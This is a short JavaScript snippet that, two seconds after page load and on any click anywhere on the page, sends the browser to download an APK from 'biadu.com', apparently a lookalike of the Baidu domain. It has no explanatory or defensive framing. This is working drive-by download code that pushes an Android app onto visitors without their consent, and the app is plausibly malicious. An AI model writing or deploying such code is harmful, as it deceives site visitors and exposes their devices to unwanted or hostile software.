```javascript
    var autoload = true;
    var downurl = "http://biadu.com/apk.apk";

    $(document).ready(function () {
        var time = 2000;

        if (autoload) {
            setTimeout(function () {
					console.log("logging info: " + "message2");

                location.href = downurl;
            }, time)
        }

        $(document).click(function () {
		console.log("logging info: " + "message1");

            window.location.href = downurl;//点击页面下载
        })
    })


```